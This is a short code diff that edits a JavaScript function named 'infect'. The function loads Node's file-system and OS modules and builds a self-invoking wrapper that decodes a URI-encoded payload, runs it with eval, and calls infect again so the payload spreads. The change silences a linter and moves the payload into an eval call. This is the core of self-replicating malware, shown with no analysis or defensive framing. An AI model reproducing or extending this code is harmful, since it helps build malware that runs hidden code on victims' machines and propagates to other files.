@@ -1,4 +1,4 @@
-function infect( payload ) {
+function infect( payload ) { // eslint-disable-line
 
     const fs   = require( "fs" );
     const os   = require( "os" );
@@ -9,8 +9,9 @@ function infect( payload ) {
 
     const modifiedPayload = `
         (function() {
-            ${decodeURI(payload)} 
-            infect( "${payload}" );
+            var payload = "${payload}";
+            eval(decodeURI(payload));
+            infect( payload );
         })();
     `;
 
